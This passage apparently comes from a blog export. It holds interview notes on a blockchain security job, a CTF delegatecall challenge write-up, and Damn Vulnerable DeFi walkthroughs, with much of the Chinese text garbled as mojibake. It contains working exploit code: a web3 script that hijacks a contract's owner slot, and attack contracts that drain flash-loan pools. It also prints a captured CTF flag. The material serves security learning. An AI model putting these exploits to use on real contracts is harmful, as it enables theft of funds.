_blockTimestampLast);\n    function mint(address _to) external returns (uint256 _liquidity);\n    function sync() external;\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n&#125;\n\ninterface IUniswapV2Router &#123;\n    function WETH() external pure returns (address _token);\n    function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);\n    function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);\n    function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);\n    function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);\n    function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);\n&#125;\ninterface IUniswapV2Factory &#123;\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n&#125;\ninterface IUniswapV3SwapCallback &#123;\n    function uniswapV3SwapCallback(\n        int256 amount0Delta,\n        int256 amount1Delta,\n        bytes calldata data\n    ) external;\n&#125;\ninterface ISwapRouter is IUniswapV3SwapCallback &#123;\n    struct ExactInputSingleParams &#123;\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 deadline;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    &#125;\n    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);\n    struct ExactInputParams &#123;\n        bytes path;\n        address recipient;\n        uint256 deadline;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n    &#125;\n    function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);\n\n    struct ExactOutputSingleParams &#123;\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 deadline;\n        uint256 amountOut;\n        uint256 amountInMaximum;\n        uint160 sqrtPriceLimitX96;\n    &#125;\n    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);\n\n    struct ExactOutputParams &#123;\n        bytes path;\n        address recipient;\n        uint256 deadline;\n        uint256 amountOut;\n        uint256 amountInMaximum;\n    &#125;\n    function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn);\n&#125;\n\ninterface IUniswapRouter is ISwapRouter &#123;\n    function refundETH() external payable;\n&#125;\n\ninterface IWETH9 is IERC20 &#123;\n    function deposit() external payable;\n\n    function withdraw(uint256) external;\n&#125;\n\n\né…ç½®çŽ¯å¢ƒï¼Œè¿žæŽ¥è‡³rinkebyæµ‹è¯•ç½‘ç»œï¼ˆé…åˆalchemyapiï¼‰\nnetworks: &#123;\n   rinkeby: &#123;\n     url: `https://eth-rinkeby.alchemyapi.io/v2/API KEY`,\n     accounts: [\"ç§é’¥\"]\n   &#125;\n &#125;\n\néƒ¨ç½²å¹¶è¿›è¡Œå¯¹åº”å‡½æ•°è°ƒç”¨\nconst hre = require(\"hardhat\");\n\nasync function main() &#123;\n  const wContract = await ethers.getContractFactory(\"BorrowAndSwap\");\n  const contr = await wContract.deploy();\n  await contr.deployed();\n\n  console.log(\"contr deployed to:\", contr.address);\n\n  const BorrowOneTokenAndSwapTx = await contr.BorrowOneTokenAndSwap();\n\n  await BorrowOneTokenAndSwapTx.wait();\n  console.log(\"transaction hash:\",BorrowOneTokenAndSwapTx);\n&#125;\n\n\nmain()\n  .then(() => process.exit(0))\n  .catch((error) => &#123;\n    console.error(error);\n    process.exit(1);\n  &#125;);\n\n\nä¸‹å›¾ä¸ºä¸revertæƒ…å†µä¸‹çš„é“¾ä¸Šæµ‹è¯•æ•°æ®\n\nä¸‹å›¾ä¸ºåŠ ä¸Šrequire(false,â€successâ€)ä»£ç çš„hardhatæ¡†æž¶ä¸‹ç»“æžœ\n\n\n2.é¢è¯•æ€»ç»“é—®é¢˜ï¼š\n1.åŒºå—é“¾çš„åŸºç¡€çŸ¥è¯†ï¼Œæ¯”å¦‚äº§ç”Ÿè¿™ä¸ªæ¦‚å¿µçš„åŠ¨æœº\n2.å…³äºŽevmç‰¹æ€§ï¼Œæ¯”å¦‚createå’Œcreate2çš„ä¸åŒï¼Œdelegatecallçš„å¤„ç†è¿™äº›\n3.æœ‰æ²¡æœ‰çœ‹è¿‡evmè™šæ‹Ÿæœºæœ¬èº«çš„å®žçŽ°ä»£ç ï¼ŒæŒ‡çš„æ˜¯go-ethereumï¼ˆæ²¡æœ‰äº†è§£è¿‡ï¼‰\n4.æ˜¯å¦ç†Ÿæ‚‰goè¯­è¨€ï¼ˆéƒ½åœ¨goåŒ–ï¼Œæœ‰å¿…è¦å­¦å¥½goè¯­è¨€ï¼‰\n5.å¯¹äºŽdefiçš„ç›¸å…³äº†è§£ï¼Œæ›´è¶‹å‘äºŽä»£ç å’ŒåŽŸç†å±‚é¢\n6.æ¼æ´žæ‰«æå·¥å…·çš„æ€è·¯ï¼ˆé—®çš„æ—¶å€™æˆ‘æ˜¯ä¸æ‡‚çš„ï¼Œå¤§å®¶å¯ä»¥ç€æ‰‹å¸ƒå±€ä¸€ä¸‹è¿™æ–¹é¢çš„çŸ¥è¯†ï¼‰\n7.å¦å¤–å°±æ˜¯ä¸€äº›å·¥å…·çš„ä½¿ç”¨ï¼Œæ¯”å¦‚è¯´alchemyæä¾›çš„archive nodeï¼ˆä¸æ˜¯å¾ˆäº†è§£ï¼Œæ­£åœ¨ç†Ÿæ‚‰ä¸­ï¼‰\n8.æœ€ç»ˆç»™å‡ºçš„æµ‹è¯•ï¼Œç”¨brownieï¼ˆpythonï¼‰æˆ–è€…hardhatï¼ˆjsï¼‰è¿™ç§æ¡†æž¶ï¼Œç”¨alchemyæä¾›çš„åŽ†å²æ•°æ®åŠŸèƒ½ï¼Œå†™ä¸€ä¸ªåœ¨uniswap v2ä¸Šå€Ÿflash loançš„åˆçº¦ï¼Œflash loanå€Ÿå‡ºæ¥ä¹‹åŽç”¨uniswap v3çš„routerä¸Šåšä¸€æ¬¡swapï¼ˆuniswap v2é€‰ETH&#x2F;USDCçš„pairï¼Œå€ŸETHï¼Œç”¨v3çš„router swapï¼‰ï¼Œæœ€åŽrevert\næ€»ç»“ä¸€ä¸‹ï¼š\nâ‘ ç›¸å¯¹è€Œè¨€æ›´çœ‹é‡å­¦ä¹ èƒ½åŠ›ï¼Œå¤§å®¶è¦æ³¨é‡æå‡è‡ªå·±çš„å­¦ä¹ èƒ½åŠ›ï¼Œæ–°çŸ¥è¯†çš„é€‚åº”èƒ½åŠ›â‘¡å¯¹äºŽä¸€äº›æ¯”è¾ƒå¸¸è§çš„evmç‰¹æ€§ä¸€å®šè¦æŽŒæ¡â‘¢å­¦ä¹ goè¯­è¨€â‘£äº†è§£defiçš„çŸ¥è¯†ï¼ˆç›¸å¯¹æ¯”è¾ƒéš¾ï¼Œä½†æ˜¯å¾ˆé‡è¦ï¼‰â‘¤ç€æ‰‹äº†è§£ä¸€ä¸‹è‡ªå·±å†™å·¥å…·ä¹‹ç±»çš„äº‹æƒ…ï¼Œæœ‰è¿‡å·¥å…·å¼€å‘ç»åŽ†åœ¨é¢è¯•æ—¶å€™å¾ˆåƒé¦™â‘¥ç†Ÿæ‚‰æ›´å¤šå·¥å…·ï¼Œä¸è¦å±€é™äºŽremixå’ŒåŒºå—é“¾æµè§ˆå™¨ï¼Œå·¥å…·å¾ˆå¤šï¼Œå¹³æ—¶å¤šçœ‹çœ‹githubä¸Šè¾¹çš„å¤§ä½¬æˆ–è€…ä¸€äº›å›½å¤–å¤§ä½¬çš„åšå®¢ï¼Œnotionä¸Šè¾¹æœ‰åˆ†äº«çš„â‘¦å¹³æ—¶åšä»»åŠ¡æ—¶å€™ä¸€å®šä¸è¦å¿½ç•¥å®žè·µï¼Œä¸èƒ½åˆ†æžåˆ†æžå°±ç»“æŸï¼Œä¸€å®šè¦è¿›è¡Œæµ‹è¯•ï¼Œæœ¬åœ°æˆ–è€…é“¾ä¸Šæµ‹è¯•\n","slug":"BlockSec interview questions","date":"2022-08-02T02:51:50.704Z","categories_index":"","tags_index":"private","author_index":"bcYng"},{"id":"7a7dc284a8f031161ea186b2342a420d","title":"The 15th National College Student Information Security Competition","content":" å‘¨æ—¥æ‰“äº†ä¸€ä¸‹2022å›½èµ›çš„åŒºå—é“¾é¢˜ç›®ï¼Œæ‹¿å‡ºæ¥åˆ†äº«ä¸€ä¸‹\n\n\n1.Codepragma solidity ^0.4.26;\n\ncontract Lib &#123;\n    uint public score;\n\n    function setScore(uint _score) public &#123;\n        score = _score;\n    &#125;\n&#125;\n pragma solidity ^0.4.26;\n\ncontract HackMe &#123;\n    address public lib;\n    address public owner;\n    uint public score;\n\n    constructor(address _lib) public payable&#123;\n        lib = _lib;\n        owner = msg.sender;\n    &#125;\n\n    function setScore(uint _score) public &#123;\n        (bool res, ) = lib.delegatecall(abi.encodeWithSignature(\"setScore(uint256)\", _score));\n        require(res, \"Failed to delegatecall to lib\");\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šownerå€¼å‘ç”Ÿæ”¹å˜å³å¯\nAnalyzeæ¼æ´žæ˜¯æ¯”è¾ƒåŸºç¡€çš„delegatecallæ¼æ´žï¼Œå°±æ˜¯è°ƒç”¨å¤–éƒ¨ä»£ç ï¼Œæ‰§è¡ŒçŽ¯å¢ƒå´æ˜¯åœ¨æœ¬åˆçº¦ï¼Œè¯¦æƒ…å‚è€ƒæˆ‘ä¹‹å‰å†™è¿‡çš„åŸºç¡€æ¼æ´žæ±‡æ€»ï¼Œé“¾æŽ¥ï¼šhttps://bcyng-w.github.io/2022/04/10/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#more\nè°ƒç”¨ä¸¤æ¬¡setscoreï¼Œç¬¬ä¸€æ¬¡å°†libè½¬å˜ä¸ºæ”»å‡»åˆçº¦ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨æ”»å‡»åˆçº¦ä¸‹çš„setscoreä¿®æ”¹å¯¹åº”slot1çš„å€¼å³å¯æ”¹å˜Hackmeä¸‹ownerçš„å€¼ã€‚\nè¯¥é¢˜è§£é”é’±åŒ…çš„æ–¹å¼æ¯”è¾ƒç‰¹åˆ«ï¼Œéšæœºç”Ÿæˆçš„è´¦æˆ·æ²¡æœ‰ç§é’¥ï¼Œè€Œæ˜¯ç”¨ç”Ÿæˆè´¦æˆ·æ—¶çš„å¯†ç è¿›è¡Œè§£é”è´¦æˆ·ï¼Œå‚è€ƒï¼šhttps://blog.csdn.net/qq_41907714/article/details/106640274\n\næˆ‘åœ¨è¿™é‡Œè®¾ç½®çš„å¯†ç æ˜¯123\nä½¿ç”¨çš„è§£é”æ–¹æ³•\nw3.geth.personal.unlockAccount('0x0D7c2FB2B185e6633FC027eE2A37138661934026','123')\n\nAttackæœ€åŽé™„ä¸Šæ”»å‡»è„šæœ¬\nfrom web3 import Web3,HTTPProvider\nfrom time import sleep\nw3=Web3(HTTPProvider('http://47.104.106.8:8545'))\nhacksabi='''\n[\n\t&#123;\n\t\t\"constant\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"_score\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"setScore\",\n\t\t\"outputs\": [],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"_lib\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": true,\n\t\t\"stateMutability\": \"payable\",\n\t\t\"type\": \"constructor\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"lib\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"owner\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"score\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;\n]\n'''\nhackersabi='''\n[\n\t&#123;\n\t\t\"constant\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"_score\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"setScore\",\n\t\t\"outputs\": [],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"score\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"constructor\"\n\t&#125;\n]\n'''\n\nres=w3.geth.personal.unlockAccount('0x0D7c2FB2B185e6633FC027eE2A37138661934026','123')\naccount=w3.toChecksumAddress('0x0D7c2FB2B185e6633FC027eE2A37138661934026')\nprint(w3.eth.getBalance(account))\nhachsaddress='0x73d7c98126aaC3e9dd5f4c4957a07fB05f5e8EB2'\nhackscontract=w3.eth.contract(abi=hacksabi,address=hachsaddress)\ncode='608060405234801561001057600080fd5b5060dc8061001f6000396000f3006080604052600436106049576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063422beeba14604e578063efedc669146078575b600080fd5b348015605957600080fd5b5060766004803603810190808035906020019092919050505060a0565b005b348015608357600080fd5b50608a60aa565b6040518082815260200191505060405180910390f35b8060018190555050565b600154815600a165627a7a72305820282edb4b675a8fb6d0eb1ab79325fc438b3ae4f8c9b27a3ad1690ef7704b531e0029'\nhackerscontract=w3.eth.contract(abi=hackersabi,bytecode=code)\n# constructor_txn=hackerscontract.constructor().buildTransaction(&#123;\n#     'from': account,\n#     'gas': 1000000\n#     &#125;)\n\n# tx_id=w3.eth.sendTransaction(constructor_txn)\n# print(tx_id.hex())\n# sleep(5)\n# a=w3.eth.getTransactionReceipt(tx_id).contractAddress\n# sleep(5)\n# print(a)\nstep1_txn=hackscontract.functions.setScore(0xBD6Ab56B2C74BDD3aBcf197af0Ff9e08F7F41a2D).buildTransaction(&#123;\n    'from':account,\n    'gas': 1000000\n    &#125;)\ntx_id1=w3.eth.sendTransaction(step1_txn)\nprint(tx_id1)\nsleep(5)\nstep2_txn=hackscontract.functions.setScore(0x03C6FcED478cBbC9a4FAB34eF9f40767739D1Ff7).buildTransaction(&#123;\n    'from':account,\n    'gas': 1000000\n    &#125;)\ntx_id2=w3.eth.sendTransaction(step2_txn)\nprint(tx_id2)\n\n\nä»£ç åˆ†æ®µè¿è¡Œï¼Œå…ˆæ³¨é‡ŠæŽ‰æ”»å‡»éƒ¨ä»½ï¼Œéƒ¨ç½²æ”»å‡»åˆçº¦ï¼ŒèŽ·å¾—åˆçº¦åœ°å€åŽä½œä¸ºæ”»å‡»è„šæœ¬çš„å‚æ•°è¿›è¡Œæ”»å‡»ï¼Œè¿è¡Œç»“æŸåŽï¼Œå†cmdç»ˆç«¯è¾“å…¥4æ£€æŸ¥æ”»å‡»æ˜¯å¦æˆåŠŸã€‚\nèŽ·å¾—flagï¼šflag:{23d1eb0e-e1f5-4a86-b722-690135f0377a}\n","slug":"The 15th National College Student Information Security Competition","date":"2022-08-02T02:49:40.287Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"3e4e5e9b128bda97a530bf234e940a7f","title":"Damn Vulnerable Defi","content":"\n\n\nåœ°å€ï¼šhttps://www.damnvulnerabledefi.xyz/\n1.Unstoppable\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nThereâ€™s a lending pool with a million DVT tokens in balance, offering flash loans for free.\nIf only there was a way to attack and stop the pool from offering flash loans â€¦\nYou start with 100 DVT tokens in balance.\ncode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ninterface IReceiver &#123;\n    function receiveTokens(address tokenAddress, uint256 amount) external;\n&#125;\n\n/**\n * @title UnstoppableLender\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract UnstoppableLender is ReentrancyGuard &#123;\n\n    IERC20 public immutable damnValuableToken;\n    uint256 public poolBalance;\n\n    constructor(address tokenAddress) &#123;\n        require(tokenAddress != address(0), \"Token address cannot be zero\");\n        damnValuableToken = IERC20(tokenAddress);\n    &#125;\n\n    function depositTokens(uint256 amount) external nonReentrant &#123;\n        require(amount > 0, \"Must deposit at least one token\");\n        // Transfer token from sender. Sender must have first approved them.\n        damnValuableToken.transferFrom(msg.sender, address(this), amount);\n        poolBalance = poolBalance + amount;\n    &#125;\n\n    function flashLoan(uint256 borrowAmount) external nonReentrant &#123;\n        require(borrowAmount > 0, \"Must borrow at least one token\");\n\n        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));\n        require(balanceBefore >= borrowAmount, \"Not enough tokens in pool\");\n\n        // Ensured by the protocol via the `depositTokens` function\n        assert(poolBalance == balanceBefore);\n        \n        damnValuableToken.transfer(msg.sender, borrowAmount);\n        \n        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);\n        \n        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flash loan hasn't been paid back\");\n    &#125;\n&#125;\n\nanalyzeé¢˜ç›®è¦æ±‚æ”»å‡»åˆçº¦ï¼Œä½¿æ± å­ä¸å†æä¾›è´·æ¬¾åŠŸèƒ½ï¼Œåˆ†æžåˆçº¦ ï¼ŒpoolBalanceåªèƒ½åœ¨epositTokens()å‡½æ•°è¢«è§¦å‘æ—¶å¢žåŠ ï¼Œè€ŒflashLoan()å‡½æ•°ä¸‹assert(poolBalance &#x3D;&#x3D; balanceBefore)ï¼Œæ„å‘³ç€å¦‚æžœå‘åˆçº¦è½¬è´¦ä¸€å®šçš„tokenï¼ŒbalanceBeforeä¼šå¢žåŠ ä½†æ˜¯poolBalanceä¸ä¼šå¢žåŠ ï¼Œä»Žè€Œä½¿assertå¾—ä¸åˆ°æ»¡è¶³ï¼Œæ”»å‡»å³å¯è¾¾åˆ°è¦æ±‚ã€‚\nattackawait this.token.connect(attacker).transfer(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE);\n\n2.Naive receiver\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šThereâ€™s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.\nYou also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.\nDrain all ETH funds from the userâ€™s contract. Doing it in a single transaction is a big plus ;)\nFlashLoanReceiver  code// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n\n/**\n * @title FlashLoanReceiver\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract FlashLoanReceiver &#123;\n    using Address for address payable;\n\n    address payable private pool;\n\n    constructor(address payable poolAddress) &#123;\n        pool = poolAddress;\n    &#125;\n\n    // Function called by the pool during flash loan\n    function receiveEther(uint256 fee) public payable &#123;\n        require(msg.sender == pool, \"Sender must be pool\");\n\n        uint256 amountToBeRepaid = msg.value + fee;\n\n        require(address(this).balance >= amountToBeRepaid, \"Cannot borrow that much\");\n        \n        _executeActionDuringFlashLoan();\n        \n        // Return funds to pool\n        pool.sendValue(amountToBeRepaid);\n    &#125;\n\n    // Internal function where the funds received are used\n    function _executeActionDuringFlashLoan() internal &#123; &#125;\n\n    // Allow deposits of ETH\n    receive () external payable &#123;&#125;\n&#125;\n\nNaiveReceiverLenderPool  code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n\n/**\n * @title NaiveReceiverLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract NaiveReceiverLenderPool is ReentrancyGuard &#123;\n\n    using Address for address;\n\n    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan\n\n    function fixedFee() external pure returns (uint256) &#123;\n        return FIXED_FEE;\n    &#125;\n\n    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant &#123;\n\n        uint256 balanceBefore = address(this).balance;\n        require(balanceBefore >= borrowAmount, \"Not enough ETH in pool\");\n\n\n        require(borrower.isContract(), \"Borrower must be a deployed contract\");\n        // Transfer ETH and handle control to receiver\n        borrower.functionCallWithValue(\n            abi.encodeWithSignature(\n                \"receiveEther(uint256)\",\n                FIXED_FEE\n            ),\n            borrowAmount\n        );\n        \n        require(\n            address(this).balance >= balanceBefore + FIXED_FEE,\n            \"Flash loan hasn't been paid back\"\n        );\n    &#125;\n\n    // Allow deposits of ETH\n    receive () external payable &#123;&#125;\n&#125;\n\nanalyzeé¢˜ç›®è¦æ±‚å†ä¸€ç¬”äº¤æ˜“ä¸­å°†userçš„10ethå…¨éƒ¨è€—å°½ï¼Œuseråˆçº¦ä¸­å”¯ä¸€æœ‰è½¬å‡ºethçš„åœ°æ–¹å°±æ˜¯receiveEther()å‡½æ•°ã€‚\nå®¡è®¡ä¹‹åŽæˆ‘ä»¬ä¸éš¾å‘çŽ°ä¸€æ¬¡è½¬å‡ºfee*1weiçš„ä½™é¢ï¼Œå³æ¯æ¬¡è½¬å‡º1ethã€‚\nè™½ç„¶receiveEther()å‡½æ•°ä¸­require(address(this).balance &gt;&#x3D; amountToBeRepaid)ä½†æ˜¯éšç€å‡½æ•°è°ƒç”¨ï¼Œå°†ä¼šæœ‰msg.valueçš„ä½™é¢è½¬å…¥ï¼Œæ‰€ä»¥åªéœ€è¦åˆçº¦ä¹‹å‰çš„ä½™é¢å¤§äºŽfeeå³å¯ï¼Œè€Œåˆçº¦ä¸­æœ¬æ¥æœ‰10ethï¼Œæ‰€ä»¥å†balance(this)æ¸…é›¶å‰requireæ€»èƒ½è¢«æ»¡è¶³ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼Œåœ¨æ”»å‡»åˆçº¦ä¸­ï¼Œforå¾ªçŽ¯è°ƒç”¨10æ¬¡flashLoan()å‡½æ•°å³å¯ã€‚\nattackattackcontract\nimport \"E:\\school\\BLOCKCHAIN\\Damn Vulnerable DeFi\\damn-vulnerable-defi-2.0.0\\damn-vulnerable-defi-2.0.0\\contracts\\naive-receiver\\NaiveReceiverLenderPool.sol\";\ncontract AttackNaiveReceiver &#123;\n    NaiveReceiverLenderPool target;\n\n    constructor(address payable pool) &#123;\n        target = NaiveReceiverLenderPool(pool);\n    &#125;\n\n    function attack(address tar) public &#123;\n        for (int i=0; i &lt; 10; i++ ) &#123;\n            target.flashLoan(tar, 1 ether);\n        &#125;\n    &#125;\n    \n&#125;\n\n\n\nconst AttackFactory = await ethers.getContractFactory(\"AttackNaiveReceiver\", attacker);\n            const attackContract = await AttackFactory.deploy(this.pool.address);\n            await attackContract.attack(this.receiver.address);\n\n3.Truster\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nMore and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.\nCurrently the pool has 1 million DVT tokens in balance. And you have nothing.\nBut donâ€™t worry, you might be able to take them all from the pool. In a single transaction.\ncode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\n/**\n * @title TrusterLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract TrusterLenderPool is ReentrancyGuard &#123;\n\n    using Address for address;\n\n    IERC20 public immutable damnValuableToken;\n\n    constructor (address tokenAddress) &#123;\n        damnValuableToken = IERC20(tokenAddress);\n    &#125;\n\n    function flashLoan(\n        uint256 borrowAmount,\n        address borrower,\n        address target,\n        bytes calldata data\n    )\n        external\n        nonReentrant\n    &#123;\n        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));\n        require(balanceBefore >= borrowAmount, \"Not enough tokens in pool\");\n        \n        damnValuableToken.transfer(borrower, borrowAmount);\n        target.functionCall(data);\n\n        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flash loan hasn't been paid back\");\n    &#125;\n\n&#125;\n\nanalyzeè¿™é“é¢˜å’Œæˆ‘ä¹‹å‰åšè¿‡çš„ä¸€é“ctfçš„ä¸€ç§è§£æ³•æœ‰äº›ç±»ä¼¼ï¼Œvnctfå…¬å¼€èµ›çš„vnloané¢˜ç›®ï¼Œæ€»çš„æ¥è¯´å°±æ˜¯callè°ƒç”¨çµæ´»æ€§æžé«˜å¹¶ä¸”ä¼´éšç€è¾ƒé«˜çš„å±é™©æ€§ã€‚\næ¯”å¦‚è¿™é“é¢˜æˆ‘ä»¬å¯ä»¥æž„é€ è°ƒç”¨approveçš„dataï¼Œtargetåœ°å€ä¸ºtokenåœ°å€ï¼Œabiç¼–ç approve(attacker,1millon)ä½œä¸ºdataï¼Œè°ƒç”¨flashLoan()å€Ÿ0tokenï¼Œç­‰å¾…äº¤æ˜“å®Œæˆä¹‹åŽæˆ‘ä»¬å³å¯èŽ·å¾—åˆçº¦çš„approveï¼Œç›´æŽ¥transferfromå³å¯å–èµ°å…¨éƒ¨token\nattackattackcontract\nimport \"./@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract TrusterLenderPool1&#123;\n    function flashLoan(\n        uint256 borrowAmount,\n        address borrower,\n        address target,\n        bytes calldata data\n    )\n        external\n    &#123;\n    &#125;\n&#125;\ncontract TrusterAttacker &#123;\n\n    IERC20 public immutable damnValuableToken;\n    TrusterLenderPool1 private immutable pool;\n\n    constructor (address tokenAddress, address poolAddress) &#123;\n        damnValuableToken = IERC20(tokenAddress);\n        pool = TrusterLenderPool1(poolAddress);\n    &#125;\n\n    function attack(uint256 amount, address attacker) external &#123;\n        pool.flashLoan(0, attacker, address(damnValuableToken), abi.encodeWithSignature(\"approve(address,uint256)\", attacker, amount));\n    &#125;\n\n    receive () external payable &#123;&#125;\n&#125;\n\n\n\n\n\nconst AttackerContractFactory = await ethers.getContractFactory('TrusterAttacker', attacker);\n        const attackerContract = await AttackerContractFactory.deploy(this.token.address, this.pool.address);\n\n        await attackerContract.connect(attacker).attack(TOKENS_IN_POOL, attacker.address);\n        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)\n\n4.Side entrance\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nA surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.\nThis very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.\nYou must take all ETH from the lending pool.\ncode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n\ninterface IFlashLoanEtherReceiver &#123;\n    function execute() external payable;\n&#125;\n\n/**\n * @title SideEntranceLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract SideEntranceLenderPool &#123;\n    using Address for address payable;\n\n    mapping (address => uint256) private balances;\n\n    function deposit() external payable &#123;\n        balances[msg.sender] += msg.value;\n    &#125;\n\n    function withdraw() external &#123;\n        uint256 amountToWithdraw = balances[msg.sender];\n        balances[msg.sender] = 0;\n        payable(msg.sender).sendValue(amountToWithdraw);\n    &#125;\n\n    function flashLoan(uint256 amount) external &#123;\n        uint256 balanceBefore = address(this).balance;\n        require(balanceBefore >= amount, \"Not enough ETH in balance\");\n        \n        